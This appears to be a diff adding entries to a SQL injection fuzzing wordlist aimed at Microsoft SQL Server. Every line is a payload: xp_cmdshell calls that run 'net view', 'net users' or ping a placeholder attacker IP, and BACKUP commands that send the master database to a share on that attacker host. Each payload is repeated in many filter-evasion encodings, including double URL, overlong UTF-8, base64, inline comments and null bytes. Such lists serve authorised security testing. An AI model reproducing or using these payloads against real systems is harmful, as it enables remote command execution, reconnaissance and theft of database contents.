+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec%C0%AAmaster%C0%AE%C0%AExp%C0%DFcmdshell%C0%AA%C0%AFnet%C0%ABview%C0%AF%C0%8A
+%e%x%e%c %m%a%s%t%e%r%.%.%x%p%_%c%m%d%s%h%e%l%l %'%n%e%t%+%v%i%e%w%'%
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+ and '0having'='0having'
+exec master..xp_cmdshell 'net+view'
+-- sp_password
+exec/**/master..xp_cmdshell/**/'net+view'
+
+exec--enxCdJjAR%0Amaster..xp_cmdshell--XIfMUw%0A'net+view'--jREvSJkfrafT%0A
+exec%23OCOCph%0Amaster..xp_cmdshell%23qSYhWtzZr%0A'net+view'%23BnIVda%0A
+exec%23OQuWFS%0Amaster..xp_cmdshell%23bZMVbdEUP%0A'net+view'%23tCqIKOIzQ%0A
+exec%02master..xp_cmdshell%07'net+view'
+
+exec%23%0Amaster..xp_cmdshell%23%0A'net+view'%23%0A
+exec%0Dmaster..xp_cmdshell%0C'net+view'
+
+exec--%0Amaster..xp_cmdshell--%0A'net+view'--%0A
+exec+master..xp_cmdshell+'net+view'
+
+exec%09master..xp_cmdshell%0D'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell %bf%27net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell %EF%BC%87net+users%EF%BC%87
+
+exec master..xp_cmdshell %00%27net+users%00%27
+
+exec master..xp_cmdshell 'net+users'
+%00
+ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICduZXQrdXNlcnMnCg==
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+%2565%2578%2565%2563%2520%256D%2561%2573%2574%2565%2572%252E%252E%2578%2570%255F%2563%256D%2564%2573%2568%2565%256C%256C%2520%2527%256E%2565%2574%252B%2575%2573%2565%2572%2573%2527%250A
+%65%78%65%63%20%6D%61%73%74%65%72%2E%2E%78%70%5F%63%6D%64%73%68%65%6C%6C%20%27%6E%65%74%2B%75%73%65%72%73%27%0A
+%u0065%u0078%u0065%u0063%u0020%u006D%u0061%u0073%u0074%u0065%u0072%u002E%u002E%u0078%u0070%u005F%u0063%u006D%u0064%u0073%u0068%u0065%u006C%u006C%u0020%u0027%u006E%u0065%u0074%u002B%u0075%u0073%u0065%u0072%u0073%u0027%u000A
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec /*!30990master..xp_cmdshell 'net+users'
+*/
+exec /*!00000master..xp_cmdshell 'net+users'
+*/
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec%C0%AAmaster%C0%AE%C0%AExp%C0%DFcmdshell%C0%AA%C0%AFnet%C0%ABusers%C0%AF%C0%8A
+%e%x%e%c %m%a%s%t%e%r%.%.%x%p%_%c%m%d%s%h%e%l%l %'%n%e%t%+%u%s%e%r%s%'%
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+ and '0having'='0having'
+exec master..xp_cmdshell 'net+users'
+-- sp_password
+exec/**/master..xp_cmdshell/**/'net+users'
+
+exec--GYLAIAP%0Amaster..xp_cmdshell--yoVWolTmO%0A'net+users'--XsbgOeiGd%0A
+exec%23djXzrJwlGhLJ%0Amaster..xp_cmdshell%23MROMykar%0A'net+users'%23PWkRcfaP%0A
+exec%23uBLgOJmfUOCT%0Amaster..xp_cmdshell%23cHAeXvlaQN%0A'net+users'%23PkpgeUIOjPMk%0A
+exec%0Dmaster..xp_cmdshell%0C'net+users'
+
+exec%23%0Amaster..xp_cmdshell%23%0A'net+users'%23%0A
+exec%0Bmaster..xp_cmdshell%0C'net+users'
+
+exec--%0Amaster..xp_cmdshell--%0A'net+users'--%0A
+exec+master..xp_cmdshell+'net+users'
+
+exec%09master..xp_cmdshell%0D'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell %bf%27net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell 'net+users'
+
+exec master..xp_cmdshell %EF%BC%87ping+<attackerip>%EF%BC%87
+
+exec master..xp_cmdshell %00%27ping+<attackerip>%00%27
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+%00
+ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdwaW5nKzxhdHRhY2tlcmlwPicK
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+%2565%2578%2565%2563%2520%256D%2561%2573%2574%2565%2572%252E%252E%2578%2570%255F%2563%256D%2564%2573%2568%2565%256C%256C%2520%2527%2570%2569%256E%2567%252B%253C%2561%2574%2574%2561%2563%256B%2565%2572%2569%2570%253E%2527%250A
+%65%78%65%63%20%6D%61%73%74%65%72%2E%2E%78%70%5F%63%6D%64%73%68%65%6C%6C%20%27%70%69%6E%67%2B%3C%61%74%74%61%63%6B%65%72%69%70%3E%27%0A
+%u0065%u0078%u0065%u0063%u0020%u006D%u0061%u0073%u0074%u0065%u0072%u002E%u002E%u0078%u0070%u005F%u0063%u006D%u0064%u0073%u0068%u0065%u006C%u006C%u0020%u0027%u0070%u0069%u006E%u0067%u002B%u003C%u0061%u0074%u0074%u0061%u0063%u006B%u0065%u0072%u0069%u0070%u003E%u0027%u000A
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec /*!30566master..xp_cmdshell 'ping+<attackerip>'
+*/
+exec /*!00000master..xp_cmdshell 'ping+<attackerip>'
+*/
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec%C0%AAmaster%C0%AE%C0%AExp%C0%DFcmdshell%C0%AA%C0%AFping%C0%AB%C0%BEattackerip%C0%BE%C0%AF%C0%8A
+%e%x%e%c %m%a%s%t%e%r%.%.%x%p%_%c%m%d%s%h%e%l%l %'%p%i%n%g%+%<%a%t%t%a%c%k%e%r%i%p%>%'%
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+ and '0having'='0having'
+exec master..xp_cmdshell 'ping+<attackerip>'
+-- sp_password
+exec/**/master..xp_cmdshell/**/'ping+<attackerip>'
+
+exec--OiGUDRPZn%0Amaster..xp_cmdshell--VvgHtfMw%0A'ping+<attackerip>'--ThYQtCfUtjH%0A
+exec%23CLQbZTkTt%0Amaster..xp_cmdshell%23PMuWfe%0A'ping+<attackerip>'%23TUbJnPahVP%0A
+exec%23iHXZpqMa%0Amaster..xp_cmdshell%23VjNLTiOOpBKs%0A'ping+<attackerip>'%23sTMyYDZq%0A
+exec%07master..xp_cmdshell%02'ping+<attackerip>'
+
+exec%23%0Amaster..xp_cmdshell%23%0A'ping+<attackerip>'%23%0A
+exec%0Dmaster..xp_cmdshell%0C'ping+<attackerip>'
+
+exec--%0Amaster..xp_cmdshell--%0A'ping+<attackerip>'--%0A
+exec+master..xp_cmdshell+'ping+<attackerip>'
+
+exec%0Dmaster..xp_cmdshell%0D'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell %bf%27ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+exec master..xp_cmdshell 'ping+<attackerip>'
+
+BACKUP database master to disks=%EF%BC%87\\<attackerip>\<attackerip>\backupdb.dat%EF%BC%87
+BACKUP database master to disks=%00%27\\<attackerip>\<attackerip>\backupdb.dat%00%27
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'%00
+QkFDS1VQIGRhdGFiYXNlIG1hc3RlciB0byBkaXNrcz0nXFw8YXR0YWNrZXJpcD5cPGF0dGFja2VyaXA+XGJhY2t1cGRiLmRhdCc=
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks LIKE '\\<attackerip>\<attackerip>\backupdb.dat'
+%2542%2541%2543%254B%2555%2550%2520%2564%2561%2574%2561%2562%2561%2573%2565%2520%256D%2561%2573%2574%2565%2572%2520%2574%256F%2520%2564%2569%2573%256B%2573%253D%2527%255C%255C%253C%2561%2574%2574%2561%2563%256B%2565%2572%2569%2570%253E%255C%253C%2561%2574%2574%2561%2563%256B%2565%2572%2569%2570%253E%255C%2562%2561%2563%256B%2575%2570%2564%2562%252E%2564%2561%2574%2527
+%42%41%43%4B%55%50%20%64%61%74%61%62%61%73%65%20%6D%61%73%74%65%72%20%74%6F%20%64%69%73%6B%73%3D%27%5C%5C%3C%61%74%74%61%63%6B%65%72%69%70%3E%5C%3C%61%74%74%61%63%6B%65%72%69%70%3E%5C%62%61%63%6B%75%70%64%62%2E%64%61%74%27
+%u0042%u0041%u0043%u004B%u0055%u0050%u0020%u0064%u0061%u0074%u0061%u0062%u0061%u0073%u0065%u0020%u006D%u0061%u0073%u0074%u0065%u0072%u0020%u0074%u006F%u0020%u0064%u0069%u0073%u006B%u0073%u003D%u0027%u005C%u005C%u003C%u0061%u0074%u0074%u0061%u0063%u006B%u0065%u0072%u0069%u0070%u003E%u005C%u003C%u0061%u0074%u0074%u0061%u0063%u006B%u0065%u0072%u0069%u0070%u003E%u005C%u0062%u0061%u0063%u006B%u0075%u0070%u0064%u0062%u002E%u0064%u0061%u0074%u0027
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks LIKE '\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP /*!30519database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'*/
+BACKUP /*!00000database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'*/
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP%C0%AAdatabase%C0%AAmaster%C0%AAto%C0%AAdisks%C0%BF%C0%AF%C0%DE%C0%DE%C0%BEattackerip%C0%BE%C0%DE%C0%BEattackerip%C0%BE%C0%DEbackupdb%C0%AEdat%C0%AF
+%B%A%C%K%U%P %d%a%t%a%b%a%s%e %m%a%s%t%e%r %t%o %d%i%s%k%s%=%'%\%\%<%a%t%t%a%c%k%e%r%i%p%>%\%<%a%t%t%a%c%k%e%r%i%p%>%\%b%a%c%k%u%p%d%b%.%d%a%t%'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat' and '0having'='0having'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'-- sp_password
+BACKUP/**/database/**/master/**/to/**/disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP--hqOZVYj%0Adatabase--bBcTzsCJoDlS%0Amaster--tmjZDiw%0Ato--gGAEuIqLyir%0Adisks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP%23ZYdNoapEuNig%0Adatabase%23qpoHhZkuhW%0Amaster%23TvtkRNJpGPN%0Ato%23PmgjgGTT%0Adisks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP%23ayhIVgZzC%0Adatabase%23IWVFbJd%0Amaster%23ldoqIkb%0Ato%23cUjWIi%0Adisks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP%0Edatabase%09master%01to%01disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP%23%0Adatabase%23%0Amaster%23%0Ato%23%0Adisks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP%0Cdatabase%0Bmaster%09to%09disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP--%0Adatabase--%0Amaster--%0Ato--%0Adisks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP+database+master+to+disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP%09database%0Dmaster%0Cto%0Adisks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks=%bf%27\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
